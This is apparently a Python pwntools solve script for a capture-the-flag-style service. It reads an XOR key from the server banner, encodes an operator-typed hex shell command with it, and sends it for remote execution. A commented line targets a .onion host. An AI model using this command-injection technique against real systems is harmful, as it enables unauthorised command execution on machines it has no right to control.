from pwn import *

def hexxor(s, code):
    return ''.join([chr(ord(c) ^ ord(code)) for c in s])

#shell = open('./shell.sh').read()
#shell = "df"
shell = raw_input("Cmd: ").strip('\n')
shell = shell.decode('hex')
#s = remote('mb4ri6maokwin6vi.onion', 31337)
s = remote('localhost', 7331)
header = s.recvuntil('HEX STRING: ')
#print header
code = header.split('[')[1].split(']')[0].decode('hex')
#print code

hexString = hexxor(shell, code)
#print hexString.encode('hex')
s.sendline(hexString.encode('hex'))
for i in range(20):
    print '=' * 20
    print s.recv()
s.close()

